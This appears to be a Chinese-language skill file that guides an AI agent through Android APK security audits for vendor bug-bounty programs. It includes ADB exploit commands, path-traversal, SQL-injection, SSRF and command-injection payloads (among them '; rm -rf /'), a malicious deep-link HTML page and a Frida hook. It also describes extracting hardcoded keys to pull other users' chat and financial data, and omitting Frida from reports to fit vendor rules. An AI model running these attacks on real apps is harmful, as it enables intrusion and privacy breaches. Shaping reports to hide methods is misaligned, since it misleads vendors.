---
name: android-security-audit
description: 当目标为 Android APK / 预装应用 / 厂商系统应用（HyperOS/MIUI/工程模式/OTA/诊断工具），或需要组件安全深度挖掘（导出组件/Intent 重定向/WebView/JSBridge/ContentProvider/Binder/Deep Link）、密钥追踪→未授权接口（DEX/SO/H5 提取 appId/appKey/签名密钥还原）、无 Root 无 Frida 环境下的漏洞验证与 PoC 构建、需要按厂商 SRC 移动端收录标准评估漏洞价值时调用。负责 JADX 静态分析 + ADB 动态验证的深度审计。命中场景：硬编码密钥/签名还原后未授权调接口、预装 App 提权/越权、系统 App 弹窗欺骗、Deep Link 远程触发、WebView 沙箱文件读取、APP 后端域名与 appid/appkey 提取上报深挖。正式写报告由 report 技能负责。
---

# android-security-audit — Android APK 组件安全深度审计

> **与 `miniprogram-security` 的分工**：本技能专注 **Android APK 组件安全 + 无 Frida/无 Root 漏洞验证** 的深度挖掘（对标小米 HyperOS 等厂商 SRC 收录标准）；小程序（微信/支付宝/抖音）与微信云开发见 `miniprogram-security`。两者命中同一目标时，先用本技能出组件安全结论，再按需联动。

## 何时调用（触发条件）

- 拿到 APK，需要系统化组件安全审计（静态分析 → 动态验证 → PoC → 报告）
- 目标是预装应用 / 厂商系统应用（HyperOS/MIUI、安全中心、设置、工程模式、OTA、诊断工具）
- 需要在**无 Root / 无 Frida** 环境下完成漏洞验证（ADB + PoC App + 恶意 HTML）
- 发现导出组件、Intent 重定向、PendingIntent、WebView/JSBridge、ContentProvider、Binder、Deep Link 可疑点
- 需要按厂商 SRC 移动端收录标准（等级划分/忽略清单/报告要求）评估漏洞价值并写报告

## ⚠️ 核心原则

**攻击视角定义**
- **远程攻击 (Remote)**：无需安装 App / 接触设备，通过网页、链接、消息触发。**评级更高**。
- **本地攻击 (Local)**：需安装 PoC App、使用 ADB 或物理接触。
- ✅ ADB / PoC App / 恶意 HTML 均为合法验证手段。
- ❌ **禁止依赖 Frida / Hook / Root 作为漏洞利用核心**（厂商官方标记为忽略类）。
- ✅ **Frida 边界**：允许作**密钥/签名追踪的取证工具**（见 一、密钥追踪专项）；最终 PoC 必须用提取的密钥直接构造签名请求（Python/curl），不依赖 Frida；报告不写 Frida，写密钥硬编码 + 接口未鉴权。
- 不强制依赖抓包工具：JADX 静态分析 + ADB 动态验证即可完成全流程（弱加密/HTTP 明文如需抓包佐证，另行配置代理工具）。

**证据纪律（Agent 防幻觉，强制）**
- **不编造代码、文件名、路径**——只报告 JADX / ADB 实际输出的内容。
- **字符串匹配 ≠ 证明执行**——grep 命中只是入口，必须验证调用路径与可及性（是否 exported、是否有权限保护、是否校验来源）。
- 每个发现必须标注：漏洞类型 / 证据来源（文件路径+行号）/ 攻击向量（远程/本地）/ 评级依据。

## 快速导航

| 任务 | 直达章节 |
|---|---|
| 5 分钟快速上手 | → 快速开始 |
| 🔴 密钥追踪 → 未授权接口（最高优先级） | → 一、密钥追踪专项 |
| 全量静态审计 | → 二、静态分析（2.1~2.17） |
| 发现漏洞，要动态验证 | → 三、动态验证 |
| 构建 PoC App | → 四、PoC 开发规范 |
| 判断发现值不值得报 | → 五、忽略清单与分流 |
| 写漏洞报告（正式 DOCX 提交稿） | → 调用 `report` 技能 |
| 通用加固清单 | → 七、通用修复建议 |

## 📚 参考资源

在进行特定模块审计前，**必须优先阅读**对应的参考指南（`resources/`）：

| 审计模块 | 参考文档 |
|---|---|
| 平台基础 | [Android平台概览.md](resources/Android平台概览.md) |
| 数据存储安全 | [Android数据存储.md](resources/Android数据存储.md) |
| 网络通讯安全 | [Android网络通讯.md](resources/Android网络通讯.md) |
| 加密与密钥管理 | [Android加密API.md](resources/Android加密API.md) |
| 平台 API 安全 | [Android平台API.md](resources/Android平台API.md) |
| 本地认证机制 | [Android本地认证.md](resources/Android本地认证.md) |
| 逆向与篡改防护 | [Android篡改和逆向工程.md](resources/Android篡改和逆向工程.md) |
| 反逆向防御 | [Android反逆向防御.md](resources/Android反逆向防御.md) |
| 代码质量与构建 | [Android代码质量和构建设置.md](resources/Android代码质量和构建设置.md) |
| 基础安全测试 | [Android基础安全测试.md](resources/Android基础安全测试.md) |

---

## 快速开始（5 分钟产出第一个漏洞）

### Step 1：反编译 APK

```bash
# jadx 与 apktool 均需执行（先 which jadx / which apktool 确认工具可用）
jadx -d /tmp/jadx_out --show-bad-code <path/to/target.apk>
apktool d <path/to/target.apk> -o /tmp/apktool_out
```

### Step 2：查找高危漏洞（按优先级 grep）

```bash
# 优先级 0：密钥/签名特征（最高优先级，见 一、密钥追踪专项）
grep -rniE "appKey|appSecret|secret|sign|signature|md5|encrypt|aes|rsa" /tmp/jadx_out/sources/

# 优先级 1：Intent 重定向（高危）
grep -rn "getParcelableExtra.*Intent\|startActivity.*getParcelable" /tmp/jadx_out/sources/

# 优先级 2：命令注入（高危~严重）
grep -rn "Runtime.getRuntime().exec\|ProcessBuilder" /tmp/jadx_out/sources/

# 优先级 3：Deep Link → WebView 注入（高危）
grep -rn "loadUrl.*getData\|getIntent().getData" /tmp/jadx_out/sources/

# 优先级 4：ContentProvider 路径遍历（高危）
grep -rn "openFile\|openAssetFile\|ParcelFileDescriptor.open" /tmp/jadx_out/sources/

# 优先级 5：UI 内容注入（中危，系统 App 弹窗欺骗）
grep -rn "setTitle.*getIntent\|setMessage.*getIntent\|setText.*getIntent" /tmp/jadx_out/sources/
```

### Step 3：提取资产凭证（APP 中拿到的要上报用户）

反编译产物中优先提取并向**用户上报**以下内容——这些可能是 APP 后台接口或业务接口域名，鉴权往往弱于前端接口：

```bash
# 后端接口/业务域名（反编译或抓包中出现的 URL/IP/域名，单独列出）
grep -rEoh "https?://[a-zA-Z0-9._/-]+" /tmp/jadx_out/sources/ | sort -u
grep -rEoh "([0-9]{1,3}\.){3}[0-9]{1,3}" /tmp/jadx_out/sources/ | sort -u

# appid / appkey / AppSecret / 推送密钥（上报并深入挖掘）
grep -rniE "appid|appkey|app_secret|apikey|access_key|secret_key" /tmp/jadx_out/sources/
```

- **URL/IP/域名 → 提醒用户关注**：很可能是 APP 后台接口或业务接口域名，作为可扩展攻击面进入资产测绘与接口测试（联动 `recon-js-analysis`）
- **appid/appkey 等凭证 → 上报用户并深入挖掘**：验证有效性、调用对应后端接口/云服务、越权面测试（联动 `cloud-infra-supply-chain`）

### Step 4：验证漏洞（ADB 快速验证）

```bash
# Intent 重定向
adb shell am start -n com.victim/.ExportedActivity --es redirect_intent "com.victim/.PrivateActivity"

# 命令注入
adb shell am start -n com.victim/.VulnActivity --es command "id"
adb logcat | grep "uid="

# UI 内容注入
adb shell am start -n com.victim/.VulnActivity \
  --es "title" "⚠️ 系统安全警告" --es "content" "您的账户存在异常"
```

### Step 5：判断是否值得报告

- ✅ 成功启动未导出组件 → **高危** → 报告
- ✅ 成功执行任意命令 → **高危/严重** → 报告
- ✅ 成功读取沙箱任意文件 → **高危** → 报告
- ✅ 系统级 App 弹窗内容可控 → **中危** → 报告
- ❌ 仅能启动自身导出组件 / allowBackup=True / 缺少证书绑定 → **忽略** → 不报告（见 五）

---

## 🔴 一、密钥追踪 → 未授权接口专项（最高优先级）

> **为什么排第一**：厂商 App 把签名密钥/加密公钥写死在客户端是普遍现状，命中率远高于组件安全；直接调云端 API 还绕开 Web 入口的 WAF/风控。核心链：**客户端密钥/签名逻辑硬编码（DEX/SO/H5 三层）→ 服务端只验签名不验会话（伪鉴权）或未鉴权 → 离线还原签名，未授权调接口拿全量业务数据**。

### 1.1 攻击模型与三层追踪总览

**攻击链一句话**：拿到 1 个公开 uid/ID → 反编译提取 appId/appKey/签名密钥 → 还原 sign 拼接（如 `md5(appId+appKey+ts)`）→ 直接 POST 业务接口 → 未授权批量拉数据（聊天/订单/发票/用户信息）。

| 层 | 场景 | 手段 | 典型产物 |
|---|---|---|---|
| DEX（Java/Kotlin） | 核心算法在 Java 层 | JADX 全局搜特征串 | 硬编码 appKey/secret，签名拼接可 Python 重写 |
| SO（Native） | `System.loadLibrary` + native 方法 | IDA/Ghidra 静态定位 + Frida Hook 入参出参 | 拼好的明文/算好的签名；底线 Hook 网络库截 HTTP 明文 |
| H5/JS（WebView 动态加载） | 热更新业务走远程 H5 | assets 提取 JS / chrome://inspect 断点 | JS 里 RSA 公钥/密钥，Python 构造同构 payload |

### 1.2 DEX 层追踪（静态最快，先做这个）

**特征 grep**（反编译产物）：
```bash
grep -rniE "appKey|appSecret|secret|sign|signature|md5|encrypt|aes|rsa" /tmp/jadx_out/sources/
```
- 命中后**追调用链**：找到签名函数（`sign = md5(appId + appKey + ts)` 之类），确认参数来源（uid、时间戳、固定盐）
- **Python 重写**拼接与加密逻辑，离线可算任意请求签名
- 常见形态：appId/appKey 是 IM/云服务凭证（网易云信/融云等）→ 可伪造签名调该服务接口

**案例模板（聊天记录泄露链，匿名化）**：
```bash
# 1. 普通用户界面拿到 1 个数字 uid（主页/热门房）
# 2. 反编译 APK 提取硬编码 appId/appKey
#    appId  : <反编译提取>
#    appKey : <反编译提取>
# 3. sign = md5(appId + appKey + ts)          ← 还原签名算法
# 4. POST /api/chat/sessions {"userId":<uid>}  → 列出该用户全部会话（滚雪球）
# 5. POST /api/chat/history {"fr":<uid>,"to":<peer>} → 消息正文
# 6. Base64 解码响应字段                       → 任意用户聊天记录未授权读取
```
→ 数据泄露/越权，中高危。

### 1.3 SO 层追踪（静态定位 + 动态降维）

**静态定位入口**：
- `System.loadLibrary("xxx")` 确认加载的 so
- IDA Pro / Ghidra 导出表搜 `Java_包名_类名_方法名`（静态注册）；无则找 `JNI_OnLoad` 并追 `RegisterNatives` 交叉引用（动态注册）

**动态 Hook 入参出参（降维打击，不硬啃汇编）**：
```js
// Frida 脚本：Hook 导出函数，打印入参出参，直接拿明文与签名
Java.perform(function(){
  var target = Module.findExportByName("libxxx.so", "Java_com_example_xxx_sign");
  Interceptor.attach(target, {
    onEnter: function(args){ console.log("入参:", Memory.readCString(args[2])); },
    onLeave: function(ret){ console.log("返回值:", Memory.readCString(ret)); }
  });
});
```

**底线追踪法（必杀技）**：函数都找不到时，Hook 底层网络库——`libc.so` 的 `send`/`sendto`、SSL 库的 `SSL_write`——在发包前一瞬间从内存截获**最终 HTTP 明文请求**，直接得到完整请求结构。

**⚠️ Frida 边界规则（强制）**：
- ✅ Frida 仅作**密钥/签名逻辑的取证工具**；最终 PoC 用提取的密钥直接构造签名请求（Python/curl），**不依赖 Frida**
- ❌ 禁止把"用 Frida Hook"写成漏洞本身或利用依赖（厂商官方标记为忽略类）
- 报告口径：写「密钥硬编码于客户端 + 服务端接口仅验签名未验会话/未鉴权」，全程不写 Frida

### 1.4 H5/JS 层追踪（WebView 动态加载）

- **本地提取**：解压 APK，`assets/` 目录提取 HTML/JS，直接搜加密库（`JSEncrypt`、`CryptoJS`）与密钥常量
- **远程调试**：动态加载的远程 JS → BurpSuite 注入 JS 断点代码，或 `chrome://inspect` 连接手机 WebView 前端断点，内存中直接看加密函数入参与密钥
- **密钥复用**：拿到 RSA 公钥或取密钥接口后，用 Python 构造相同加密 payload 发请求

**案例模板（H5 企业数据泄露链，匿名化）**：
```bash
# 1. GET /api/common/publicKey   → 返回 RSA 公钥 + uuid（零登录）
# 2. 客户端用公钥加密查询关键字 title
# 3. POST /api/invoice/titleQuery → 返回匹配企业抬头/税号/开户行/银行账号/地址/电话
```
→ 注意：**RSA 公钥只做"传输混淆"，不是鉴权**——拿到公钥即可构造合法密文，无需私钥；接口无 Token/登录校验 = 未授权数据泄露，高危。

### 1.5 验证要点与报告口径

- **取证链**：① 反编译/JADX 定位硬编码密钥（截图+路径）② 签名/加密逻辑还原（Python 脚本）③ 未授权请求成功返回真实数据（Burp 请求块+响应截图）
- 影响证明：拉到的数据必须是**他人/全量**数据（非自己账号、非样例）
- 定级：聊天/隐私/财务数据批量泄露 → 中高危；可写可删 = 高危/严重
- 正式报告走 `report` 技能；不写 Frida、不写逆向工具名，只写密钥硬编码 + 接口鉴权缺失

## 二、静态分析

**工具**：JADX（反编译）+ apktool（Manifest/资源）
**目标**：锁定攻击面，覆盖厂商全部收录漏洞类型

### 2.1 Manifest 分析

```bash
cat /tmp/apktool_out/AndroidManifest.xml
```

检查项：
- 筛选 `android:exported="true"` 的组件（Activity / Service / Receiver / Provider）。
- 即使 `exported="true"`，也需检查是否配置了 `android:permission`（签名权限或系统权限）。
- 提取所有 Scheme（`<data android:scheme="..."/>`）、`<intent-filter>` 中的 action。
- 检查 `android:taskAffinity` 是否在敏感 Activity 上缺失（StrandHogg 劫持风险）。
- 检查自定义权限 `<permission>` 的 `protectionLevel`，`normal` 级别可被恶意 App 抢注。
- 检查 `<provider>` 的 `android:grantUriPermissions`、`<path-permission>`。
- 检查 FileProvider 的 `file_paths.xml`：`<root-path>` 或 `<external-path>` 过度暴露 → 路径遍历。

---

### 2.2 Intent 安全（高优先级，可产出高危/中危）

```bash
grep -rn "getParcelableExtra\|startActivity\|startService\|sendBroadcast\|PendingIntent" \
  /tmp/jadx_out/sources/
```

**Intent 重定向 (LaunchAnywhere)**
- 在 exported 组件中 `getParcelableExtra` 返回 `Intent` 对象后调用 `startActivity()` / `startService()` / `sendBroadcast()`。
- 攻击者可借此以受害 App 身份启动任意未导出组件或发送特权广播。

**验证步骤**
```bash
# Step 1: 定位可疑代码（getIntent().getParcelableExtra("intent") 后调用 startActivity()）
# Step 2: ADB 快速验证
adb shell am start -n com.victim/.ExportedActivity --es intent "com.victim/.PrivateActivity"
# Step 3: 截图取证，证明成功启动了未导出的 PrivateActivity
```

**漏洞判定**
- 成功启动未导出 Activity → **高危**
- 成功发送特权广播 → **高危**
- 仅能启动自身导出组件 → **忽略**

**PendingIntent 劫持**
- 搜索 `PendingIntent.getActivity` / `getService` / `getBroadcast`。
- 检查是否使用空 Intent（`new Intent()`）且未设置 `FLAG_IMMUTABLE`。

**隐式 Intent 泄露**
- 搜索 `new Intent("action")` 发送敏感数据但未 `setPackage()` / `setComponent()` → 恶意 App 可注册相同 action 拦截。

**UI 内容注入 / 弹窗欺骗（可产出中危，对应"接口逻辑漏洞可造成欺骗用户/钓鱼"）**
- 在所有 exported Activity 的 `onCreate` / `onNewIntent` 中搜索 `getIntent().getStringExtra()`。
- 追踪返回值是否传入 `setText()` / `setTitle()` / `setMessage()` / `AlertDialog.Builder.setMessage()` / `Toast.makeText()` 等 UI 渲染方法。
- **高危场景**：系统级 App（安全中心、设置、权限管理器）的弹窗内容可控 → 用户天然信任系统弹窗，可伪造安全警告、诱导授权；Dialog 含可点击按钮触发敏感操作。
- **排除条件**：Activity 配置了签名/系统级 `android:permission`；存在来源校验（`callingPackage` 白名单）；内容经过严格过滤。

**典型漏洞模式**
```java
String title = getIntent().getStringExtra("page_title");    // 攻击者可控
actionBar.setTitle(title);                                  // 直接渲染，无校验
```

**验证步骤**
```bash
adb shell am start -n com.victim/.VulnActivity \
  --es "title" "⚠️ 系统安全警告" --es "content" "您的账户存在异常，请立即验证身份"
```

**漏洞判定**
- 系统级 App 弹窗内容可控 → **中危**（欺骗性强）
- 普通 App 弹窗内容可控 → **低危**（需评估实际危害）
- Activity 配置了签名级权限 → **忽略**

---

### 2.3 数据访问安全（可产出中危~高危）

```bash
grep -rn "openFile\|openAssetFile\|ParcelFileDescriptor\|rawQuery\|ZipInputStream\|ZipEntry" \
  /tmp/jadx_out/sources/
grep -rn "ClipboardManager\|setPrimaryClip" /tmp/jadx_out/sources/
```

**ContentProvider 路径遍历**
- `openFile` / `openAssetFile` 中是否对 URI 进行 `../` 过滤。

**验证步骤**
```bash
adb shell content read --uri "content://com.victim.provider/../../../data/data/com.victim/databases/private.db"
```

**漏洞判定**：成功读取沙箱任意文件 → **高危**；仅能读取自身数据 → **忽略**

**ContentProvider SQL 注入**
- `query()` / `update()` / `delete()` 中 `selection` 参数是否直接拼接；`rawQuery()` 是否使用用户输入。

**验证步骤**
```bash
adb shell content query --uri "content://com.victim.provider/users" --where "name='test' OR 1=1--"
```

**漏洞判定**：成功绕过查询条件读取敏感数据 → **高危**；仅能查询自身数据 → **中危**

**Zip Slip 路径遍历**
- `ZipInputStream` / `ZipEntry.getName()` → 解压路径是否校验 `../`，可覆写沙箱文件实现代码执行。

**漏洞判定**：成功覆写沙箱文件 → **高危**（可能导致代码执行）

**剪贴板泄露**
- `ClipboardManager.setPrimaryClip` 是否写入敏感数据（密码、token），恶意 App 可读取。

**漏洞判定**：写入密码/token → **中危**；非敏感数据 → **忽略**

---

### 2.4 WebView 安全（可产出中危~高危）

```bash
grep -rn "setJavaScriptEnabled\|addJavascriptInterface\|evaluateJavascript\|loadUrl\|loadDataWithBaseURL" \
  /tmp/jadx_out/sources/
grep -rn "setAllowFileAccessFromFileURLs\|setAllowUniversalAccessFromFileURLs\|onReceivedSslError\|setWebContentsDebuggingEnabled" \
  /tmp/jadx_out/sources/
```

**JS 注入 / RCE**
- `setJavaScriptEnabled(true)` + `addJavascriptInterface` → 若 `targetSdk < 17`，可 RCE。
- `evaluateJavascript()` 参数是否可控。

**漏洞判定**
- targetSdk < 17 + addJavascriptInterface → **高危**（RCE）
- targetSdk >= 17 + @JavascriptInterface 方法参数可控 → **中危**

**SOP 绕过 / 沙箱文件读取**
- `setAllowFileAccessFromFileURLs(true)` / `setAllowUniversalAccessFromFileURLs(true)`。
- `loadUrl()` 参数是否来自外部 Intent，配合 `file://` 可读取沙箱文件。

**验证步骤**
```bash
adb shell am start -n com.victim/.WebViewActivity --es url "file:///data/data/com.victim/databases/private.db"
```

**漏洞判定**：成功读取沙箱任意文件 → **高危**；仅能读取公开文件 → **中危**

**WebView 调试开启**：`WebView.setWebContentsDebuggingEnabled(true)` → 生产环境 **低危**（需本地网络访问）。
**SSL 错误处理**：`onReceivedSslError` 无条件 `proceed()` → **中危**（客户端未实施有效证书校验）。

---

### 2.5 敏感数据与加密

```bash
grep -rn "Cipher.getInstance\|AES/ECB\|AES/CBC\|getSharedPreferences\|MODE_WORLD_READABLE\|getExternalStorageDirectory\|Log\.d\|Log\.v\|Log\.i" \
  /tmp/jadx_out/sources/
```

- `AES/ECB`（确定性加密）、`AES/CBC` 无 HMAC 或硬编码 IV。
- `getSharedPreferences` → `MODE_WORLD_READABLE` / `MODE_WORLD_WRITEABLE`。
- `getExternalStorageDirectory` → 是否在 SD 卡写入敏感数据。
- `Log.d` / `Log.v` / `Log.i` → 是否记录敏感信息到 logcat。

**硬编码应用凭证与后端域名（重点上报项）**
- `appid / appkey / AppSecret / AK / SK / 推送密钥` → **必须上报用户并深入挖掘**：验证有效性、调用对应后端接口/云服务（联动 `cloud-infra-supply-chain`）、越权面测试
- 反编译/抓包中的 URL/IP/域名 → 提醒用户关注，**可能是 APP 后台接口或业务接口域名**，作为可扩展攻击面进入资产测绘（联动 `recon-js-analysis`）

**漏洞判定**
- MODE_WORLD_READABLE/WRITEABLE → **中危**（其他 App 可读取）
- SD 卡写入敏感数据 → **中危**
- Log 输出敏感信息 → **低危**（需 ADB 访问）

---

### 2.6 认证与权限

```bash
grep -rn "X509TrustManager\|checkServerTrusted\|HostnameVerifier\|onReceivedSslError\|getExtras\|getParcelable\|getSerializable\|PreferenceActivity\|isValidFragment" \
  /tmp/jadx_out/sources/
```

**证书校验绕过**
- 自定义 `X509TrustManager` → `checkServerTrusted()` 空实现；`HostnameVerifier` → `verify()` 始终 `true`；`onReceivedSslError` 无条件 `proceed()`。

**漏洞判定**：证书校验绕过 → **中危**

**Parcelable 反序列化 (Bundle mismatch)**
- exported 组件中 `getIntent().getExtras()` 的类型转换，不同进程反序列化行为不一致可能导致权限提升。

**漏洞判定**：成功利用 Bundle mismatch 提权 → **高危**

**Fragment Injection**
- 继承自 `PreferenceActivity` 的 exported Activity → 检查 `isValidFragment()` 是否重写（Android 4.4+ 已修复，自定义实现仍有风险）。

**漏洞判定**：可加载任意 Fragment → **中危**

---

### 2.7 广播安全

```bash
grep -rn "sendOrderedBroadcast\|registerReceiver\|sendStickyBroadcast" /tmp/jadx_out/sources/
```

- **有序广播劫持**：`sendOrderedBroadcast()` 无权限保护 → 恶意 App 设高优先级拦截 → **中危**。
- **动态注册接收器**：`registerReceiver()` 未指定权限 → 任意 App 可向其发送广播 → **中危**。
- **Sticky Broadcast 注入**：`sendStickyBroadcast()` 已废弃且不安全 → **低危**。

---

### 2.8 系统功能滥用（可产出中危~严重）

```bash
grep -rn "Settings.Secure.putString\|Settings.System.putString\|Settings.Global.putString\|enabled_accessibility_services\|PackageInstaller" \
  /tmp/jadx_out/sources/
grep -rn "content://settings/secure\|content://settings/global" /tmp/jadx_out/sources/
```

**无障碍服务开关**
- `Settings.Secure.putString("enabled_accessibility_services", ...)` 是否可被 exported 组件触发。

**验证步骤**
```bash
adb shell am start -n com.victim/.VulnActivity --es service "com.malicious/.MaliciousAccessibilityService"
```

**漏洞判定**：成功开启恶意无障碍服务 → **高危**（可窃取敏感信息）

**设置修改绕过**
- `Settings.Secure/System/Global.putString` 是否可通过外部 Intent 或 `content://settings/secure`、`content://settings/global` 触发安全设置变更。

**漏洞判定**：成功修改安全设置 → **中危**

**静默安装**
- `PackageInstaller` / `pm install` 相关调用是否可被外部触发。

**漏洞判定**
- 用户完全无感知的静默安装 → **严重**
- 有明确弹框或提示 → **高危**

---

### 2.9 Binder 服务安全（可产出高危，系统 App 重点）

```bash
grep -rn "ServiceManager.addService\|ServiceManager.getService\|checkCallingPermission\|checkCallingUid\|onBind" \
  /tmp/jadx_out/sources/
```

**厂商自定义系统服务**
- `ServiceManager.addService()` 注册的自定义服务运行在 system_server（UID 1000），不受 Manifest exported 约束，任何 App 可通过 `ServiceManager.getService("service_name")` 获取 Binder 代理。
- 检查 AIDL 方法实现中是否有 `checkCallingPermission()` / `checkCallingUid()` 校验；缺少校验 = 第三方 App 可直接调用系统级方法。

**验证步骤**
```bash
# Step 1: 找到 ServiceManager.addService("custom_service", ...)
# Step 2: 提取 AIDL
find /tmp/jadx_out/sources -name "*.aidl"
# Step 3: 构建 PoC App 调用该服务（见 四）
```

**漏洞判定**
- 成功调用系统级方法（读写系统数据、修改设置）→ **高危**
- 成功调用特权操作（安装应用、访问受保护资源）→ **严重**

**导出 Service 的 Bound 模式**
- 搜索 exported Service 的 `onBind()` 返回的 IBinder，从受害 App 提取 AIDL，在 PoC App 中 `bindService()` 后逐个调用接口方法（攻击面远大于 Started Service）。

**SELinux 域感知**
- 审计系统 App 时检查 SELinux domain：`system_app` / `platform_app` / `priv_app` / `untrusted_app`，不同 domain 的 allow 规则差异直接影响漏洞利用范围。

```bash
adb shell ps -Z | grep <package>
```

---

### 2.10 Deep Link 安全（可产出中危~高危）

```bash
grep -A5 "android:scheme\|android:host\|android:autoVerify" /tmp/apktool_out/AndroidManifest.xml
grep -rn "getIntent().getData\|getScheme\|getHost\|getQueryParameter" /tmp/jadx_out/sources/
```

**Deep Link → 内部功能触发**
- URI 的 host、path、query 参数是否有白名单校验。

**验证步骤**
```bash
adb shell am start -a android.intent.action.VIEW -d "myapp://path?param=payload"
```

**Deep Link → WebView URL 注入链（远程攻击，评级更高）**
- Deep Link 处理中是否将 URI 参数传给 `WebView.loadUrl()` → 攻击者通过浏览器点击链接远程触发 WebView 加载任意页面。
- 典型链路：`myapp://webview?url=https://attacker.com` → 取出 `url` 参数 → `webView.loadUrl(url)`。

**验证步骤**
```bash
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://webview?url=file:///data/data/com.victim/databases/private.db"
```

**漏洞判定**
- 远程触发 WebView 加载任意 URL / 远程读取沙箱文件 → **高危**
- 本地触发内部功能 → **中危**

**Deep Link → Intent 重定向**
- Deep Link 处理中是否根据 URI 参数构造 Intent 并 `startActivity()` → 成功启动未导出组件 → **高危**。

**App Links 配置**
- `android:autoVerify="true"` 未配置时可被恶意 App 抢注相同 scheme+host → **低危**。

**远程验证（恶意 HTML，无需额外脚本）**
```html
<!-- deeplink_poc.html：发送到目标手机，浏览器打开即可 -->
<a href="myapp://path?param=payload">点击触发</a>
<script>location.href = "myapp://webview?url=file:///data/data/com.victim/databases/private.db";</script>
```

---

### 2.11 SSRF 与网络请求安全（可产出中危~高危）

```bash
grep -rn "URL()\|HttpURLConnection\|OkHttpClient\|Retrofit\|openConnection" /tmp/jadx_out/sources/ | \
  grep -i "getIntent\|getExtra\|getData\|getQueryParam"
```

**SSRF**
- 请求 URL 来自外部输入（Intent extras、Deep Link 参数）时，攻击者可指向 `http://127.0.0.1`、`http://10.0.0.1`、云元数据 `http://169.254.169.254`。

**验证步骤**
```bash
adb shell am start -n com.victim/.VulnActivity --es url "http://169.254.169.254/latest/meta-data/"
```

**漏洞判定**
- 成功访问云元数据 → **高危**
- 成功访问内网服务 → **中危**

**内网地址过滤绕过**
- 十六进制 IP `0x7f000001`、八进制 `0177.0.0.1`、IPv6 `[::1]`、DNS rebinding、302 重定向到内网地址。

**WebView 中的 SSRF**
- WebView 加载 URL 可控 + 自定义 `shouldInterceptRequest()` → 检查拦截逻辑是否将请求转发到 App 后端。

---

### 2.12 WebView JSBridge 安全（可产出中危~严重）

```bash
grep -rn "shouldOverrideUrlLoading\|@JavascriptInterface\|jsbridge\|evaluateJavascript" /tmp/jadx_out/sources/
```

**自定义 JSBridge**
- `shouldOverrideUrlLoading()` 中对自定义 scheme（如 `jsbridge://`）的拦截处理；检查 method 白名单是否完整、param 是否有校验。
- 若 WebView 加载的 URL 可控（见 2.4），攻击者可通过注入 JS 调用 JSBridge 任意方法。

**验证步骤**
```bash
# jsbridge://readFile?path=/data/data/com.victim/databases/private.db
```

**@JavascriptInterface 方法参数校验**
- 方法参数是否直接用于文件操作（`new File(param)`）、数据库查询（SQL 拼接）、Intent 构造（`Intent.parseUri(param)`）等敏感操作。

**JSBridge → 文件读取链**
- JSBridge 方法中是否有读取文件并将内容回传给 JS 的逻辑（如 `evaluateJavascript("callback('" + fileContent + "')")`），配合 WebView URL 注入可实现远程读取沙箱文件。

**漏洞判定**
- 远程读取沙箱文件 → **高危**
- JSBridge 方法存在 SQL 注入 → **高危**
- JSBridge 方法存在命令注入 → **严重**

---

### 2.13 Native 库安全（可产出高危）

```bash
strings /tmp/apktool_out/lib/arm64-v8a/*.so | grep -E "JNI_OnLoad|Java_"
grep -rn "System.loadLibrary\|System.load\|DexClassLoader\|PathClassLoader" /tmp/jadx_out/sources/
```

**JNI 接口审计**
- `JNI_OnLoad` 和 `Java_` 前缀导出函数的参数是否来自外部输入且缺少边界校验（缓冲区溢出、格式化字符串、整数溢出）。

**不安全的 .so 加载路径**
- `System.load()` 使用外部存储路径 `/sdcard/` 加载 .so → 恶意 App 可替换实现代码执行；`DexClassLoader` / `PathClassLoader` 从可写路径加载 DEX 同理。

**漏洞判定**：从外部存储加载 .so/DEX → **高危**（代码执行）

**Native 层证书校验绕过**
- .so 中直接使用 `libcurl` / `socket()` 发起网络请求，可能绕过 Java 层证书校验和 `network_security_config.xml` → **中危**。

---

### 2.14 Fragment Injection 扩展

```bash
grep -rn "Fragment.instantiate\|getStringExtra.*fragment\|isValidFragment" /tmp/jadx_out/sources/
```

**自定义 Fragment 加载逻辑**
- `Fragment.instantiate(context, className)` 中 `className` 是否来自外部输入（Intent extras、Deep Link 参数）；导出 Activity 中 `getIntent().getStringExtra("fragment")` / `"fragment_class"` 动态加载 Fragment。
- `isValidFragment()` 直接 `return true` 或仅做包名前缀校验（`fragmentName.startsWith("com.example.")`）→ 等于没有校验。

**验证步骤**
```bash
adb shell am start -n com.victim/.VulnActivity --es fragment "com.malicious.MaliciousFragment"
```

**漏洞判定**：成功加载任意 Fragment → **中危**

---

### 2.15 命令执行（可产出高危~严重）

```bash
grep -rn "Runtime.getRuntime\|ProcessBuilder\|\"su\"\|\"su -c\"\|ShellUtils\|CommandUtils\|RootCmd\|\.exec(" \
  /tmp/jadx_out/sources/
```

**Runtime.exec() 参数注入**
- 参数（全部或部分）来自外部输入（Intent extras、Deep Link 参数、ContentProvider 数据、WebView JSBridge 回调）时，可注入任意命令。
- `exec(String)` 经过 shell 解析（可注入 `;`/`|`/`&&`）；`exec(String[])` 直接传参（注入难度更高但仍需检查）。

**典型漏洞模式**
```java
String cmd = getIntent().getStringExtra("command");
Runtime.getRuntime().exec(cmd);              // 直接执行外部输入

String filename = getIntent().getStringExtra("file");
Runtime.getRuntime().exec("cat " + filename); // filename = "; rm -rf /" 即可注入
```

**验证步骤**
```bash
adb shell am start -n com.victim/.VulnActivity --es command "id"
adb logcat | grep "uid="
```

**su 命令链**
- `exec("su -c ...")` 后的命令参数来自外部输入 → 以 root 身份执行任意命令；厂商工具类 App（工程模式 EngineerMode、诊断工具 CIT、OTA 更新）是重点目标。

**漏洞判定**：以 root 身份执行任意命令 → **严重**

**Shell 工具类封装**
- 追踪 `ShellUtils.execCommand(String cmd)` / `CommandUtils` / `RootCmd` 等工具类的调用链，检查 `cmd` 参数是否可被外部控制；厂商系统 App 经常封装 shell 执行工具类且多个导出组件共用。

**通过 WebView/JSBridge 间接触发**
- 若 JSBridge 方法调用了 `exec()` / `ProcessBuilder`，配合 WebView URL 注入（见 2.4）可实现**远程命令执行（RCE）**。

**漏洞判定**
- 远程命令执行 → **严重**
- 本地命令执行（普通进程）→ **高危**
- 本地命令执行（特权进程 system/root）→ **严重**

---

### 2.16 权限/合规越权（HyperOS 重点）

```bash
grep -rn "TelephonyManager\|getImei\|getMeid\|getSubscriberId\|getSimSerialNumber\|Build.getSerial\|RoleManager\|isRoleHeld\|CALL_PHONE\|ANSWER_PHONE_CALLS\|startForeground\|CAMERA\|NotificationChannel\|setCategory\|IMPORTANCE_HIGH\|voip\|push\|qps" \
  /tmp/jadx_out/sources/
```

**越权判定三元组**（必须同时审计）
- 应用状态：前台/后台（用户是否可感知）。
- 系统角色：是否具备对应系统角色（如默认拨号应用）。
